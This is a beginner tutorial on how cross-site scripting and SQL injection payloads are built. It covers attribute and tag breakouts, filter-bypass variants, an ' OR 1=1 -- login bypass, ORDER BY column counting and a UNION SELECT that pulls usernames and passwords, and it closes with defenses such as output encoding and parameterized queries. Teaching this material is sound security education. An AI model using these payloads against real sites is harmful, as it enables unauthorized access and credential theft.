# Payload-Baby-Steps

*A step-by-step guide for hacker babies to understand how payloads are structured. Parental monitoring is advised.*

---

# DIY XSS Payload

## 1. Identify the Context

First, determine where your input lands in the page.

Examples include:

* Between HTML tags
* Inside an HTML attribute
* Inside an existing JavaScript block

**HTML attribute example:**

```html
<input type="text" value="USER_INPUT">
```

**JavaScript example:**

```javascript
let name = 'USER_INPUT';
```

---

## 2. Boundary Escaping

A payload typically works by breaking out of the boundary that the application expects your input to stay inside.

By *boundary*, we mean the area where the website assumes your input will remain as plain text rather than executable code.

For example, if your input lands directly in the HTML body, you may start a new tag:

```html
<script>alert(1)</script>
```

If the input is inside an attribute, you might close the current attribute (and sometimes the tag itself) first:

```html
"><script>alert(1)</script>
```

Alternative approach:

Stay inside the tag and introduce an event handler:

```html
" autofocus onfocus="alert(1)
```

---

## 3. Bypass Techniques

Sometimes simple payloads are filtered or blocked.

For example:

```html
<script>
```

is very obvious and may be detected by filters.

Alternative elements are sometimes used, such as:

```html
<img src=x onerror=alert(1)>
```

or

```html
<svg onload=alert(1)>
```

Another idea is modifying capitalization:

```html
<sCrIpt>alert(1)</ScRiPt>
```

Or experimenting with variations such as:

```html
<scr<scipt>ipt>
```

---

# DIY SQL Payload

## 1. Understand the Backend Query

A login form or search feature may interact with a query similar to:

```sql
SELECT * FROM users
WHERE username = 'USER_INPUT'
AND password = 'PASSWORD';
```

---

## 2. Break the SQL Syntax

To manipulate a query, the first step is often breaking out of the string literal.

A single quote (`'`) is commonly used because it can disrupt the expected structure.

For example, if the username field contains:

```text
'
```

the query may become:

```sql
SELECT * FROM users
WHERE username = '' '
AND password = 'PASSWORD';
```

This produces a syntax error because the quotes are no longer balanced.

---

## 3. Bypass

The goal is to turn an error condition into a valid statement.

General concepts include:

* Injecting valid SQL logic.
* Commenting out the remainder of the query.
* Altering the logic so a condition evaluates differently.

Example payload:

```text
' OR 1=1 --
```

Resulting query:

```sql
SELECT * FROM users
WHERE username = '' OR 1=1 -- '
AND password = 'PASSWORD';
```

---

## 4. Extracting Data

If data is retrieved from other tables, one approach is to design a `UNION`-based payload.

A `UNION` combines the result of the injected query with the result of the original query.

### General Process

1. Determine the number of columns returned by the original query.

   Example:

   ```sql
   ' ORDER BY 1--
   ' ORDER BY 2--
   ```

   Continue incrementing until an error occurs.

2. Match the data types of those columns.

3. Construct a compatible `UNION SELECT` statement.

Example:

```sql
' UNION SELECT null, username, password FROM users --
```

Resulting query:

```sql
SELECT id, product, price
FROM products
WHERE category = ''
UNION
SELECT null, username, password
FROM users --
```

---

# Cute Lil Summary

Payload design demonstrates why traditional input filtering and blacklist-based filtering often fail: there are many possible variations and encodings that can achieve the same outcome.

More robust defenses include:

### XSS

Use context-aware output encoding.

Example:

* Convert `<` into its encoded representation so that input is always treated as data rather than executable code.

### SQL Injection

Use parameterized queries (prepared statements).

Benefits:

* User input is treated strictly as a literal value.
* Query structure cannot be modified by user-controlled input.
* The database engine separates data from executable SQL logic.

---

## Notes

* `OR 1=1` evaluates as true.
* `--` or `#` can mark the remainder of a statement as a comment, preventing the rest of the query from being processed.



